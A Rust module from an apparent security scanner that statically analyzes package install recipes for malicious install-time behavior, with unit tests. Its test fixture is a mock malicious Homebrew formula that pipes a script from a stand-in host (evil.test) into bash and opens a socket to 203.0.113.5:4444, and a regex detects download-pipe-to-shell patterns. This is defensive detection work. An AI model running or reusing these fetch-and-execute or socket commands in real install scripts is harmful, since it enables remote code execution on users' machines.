//! Static analysis of **install recipes** — the code a package manager runs at
//! install time (a Homebrew Ruby formula, an Arch PKGBUILD or `.install` hook, a
//! dpkg maintainer script, an rpm scriptlet, an apk `.pre-install`).
//!
//! Only third-party packages reach here: that is the untrusted install code. The
//! recipe is staged to a temp dir as `recipe.<ext>` so the directory-oriented
//! analyzers pick it up by extension, and each finding becomes a [`SysSignal`].

use super::*;

/// Static-analyze an install recipe's source (a Homebrew Ruby formula, an Arch
/// PKGBUILD / `.install` shell hook, …). Stages the code as `recipe.<ext>` and
/// runs the full analyzer suite over it (matched by extension), plus a pass for
/// install-time remote code execution. Subprocess-free, so unit-testable on a
/// raw string.
pub(super) fn analyze_recipe(name: &str, code: &str, ext: &str) -> Vec<SysSignal> {
    let mut sigs = Vec::new();

    if let Some(dir) = stage_recipe(name, code, ext) {
        let findings = crate::analyze::scan_source_tree(&dir);
        let _ = std::fs::remove_dir_all(&dir);
        // Cap so one noisy recipe can't flood the node with signals.
        sigs.extend(findings.iter().take(6).map(finding_to_signal));
    }

    // Piping a download straight into a shell/interpreter during install — the
    // clearest install-time remote-code-execution tell.
    let pipe = regex::Regex::new(r"(?i)(curl|wget|fetch)\b[^\n|]*\|\s*(sudo\s+)?(sh|bash|zsh|ruby|python)")
        .expect("static regex");
    if pipe.is_match(code) {
        sigs.push(SysSignal::new("install-remote-exec (pipe to shell)", Severity::High, 40));
    }
    sigs
}

/// A finding from a language analyzer → a system signal, e.g.
/// `install-ioc (203.0.113.5)`. Points scale with severity.
fn finding_to_signal(f: &crate::model::Finding) -> SysSignal {
    let points = match f.severity {
        Severity::Critical | Severity::High => 40,
        Severity::Medium => 20,
        Severity::Low => 10,
        Severity::Info => 0,
    };
    let label =
        format!("install-{} ({})", f.category.as_str(), crate::analyze::util::snippet(&f.detail, 40));
    SysSignal::new(label, f.severity, points)
}

/// Write a recipe to a fresh temp dir as `recipe.<ext>`, so the directory-oriented
/// analyzers pick it up by extension. Returns the dir (caller removes it).
fn stage_recipe(name: &str, code: &str, ext: &str) -> Option<std::path::PathBuf> {
    let safe: String =
        name.chars().map(|c| if c.is_ascii_alphanumeric() { c } else { '_' }).collect();
    let dir = std::env::temp_dir().join(format!("postmortem-recipe-{}-{safe}", std::process::id()));
    std::fs::create_dir_all(&dir).ok()?;
    std::fs::write(dir.join(format!("recipe.{ext}")), code).ok()?;
    Some(dir)
}

/// The registrable-ish domain of a URL's host — the last two dot-labels
/// (`dl.google.com` → `google.com`, `github.com` → `github.com`). Naive for
/// multi-part TLDs (`co.uk`), which is acceptable for a coarse host comparison.
pub(super) fn host_domain(url: &str) -> Option<String> {
    let rest = url.split("://").nth(1).unwrap_or(url);
    let host = rest.split(['/', '?', '#']).next()?;
    let host = host.rsplit('@').next()?; // strip any userinfo
    let host = host.split(':').next()?; // strip port
    let labels: Vec<&str> = host.split('.').filter(|s| !s.is_empty()).collect();
    if labels.len() < 2 {
        return None;
    }
    Some(labels[labels.len() - 2..].join("."))
}


#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn recipe_signals_flags_remote_exec_and_iocs() {
        // A malicious-looking formula: pipes a remote script into bash during
        // install, and hits a hard-coded IP.
        let ruby = r#"
            class Evil < Formula
              url "https://example.com/evil-1.0.tgz"
              def install
                system "curl -fsSL https://evil.test/x.sh | bash"
                system "ruby", "-e", "TCPSocket.open('203.0.113.5', 4444)"
              end
            end
        "#;
        let labels: Vec<String> =
            analyze_recipe("evil", ruby, "rb").into_iter().map(|s| s.label).collect();
        assert!(
            labels.iter().any(|l| l.contains("install-remote-exec")),
            "curl|bash pipe flagged: {labels:?}"
        );
        assert!(
            labels.iter().any(|l| l.starts_with("install-")),
            "reused analyzers produced install-* signals: {labels:?}"
        );

        // A benign recipe yields nothing.
        let clean = r#"class Ok < Formula
              url "https://github.com/o/r/archive/1.0.tar.gz"
              def install; bin.install "ok"; end
            end"#;
        assert!(analyze_recipe("ok", clean, "rb").is_empty(), "clean recipe is quiet");
    }

    #[test]
    fn host_domain_extracts_registrable() {
        assert_eq!(host_domain("https://dl.google.com/chrome/x.dmg").as_deref(), Some("google.com"));
        assert_eq!(host_domain("https://github.com/o/r/releases/x").as_deref(), Some("github.com"));
        assert_eq!(host_domain("https://cryptomator.org/").as_deref(), Some("cryptomator.org"));
    }
}
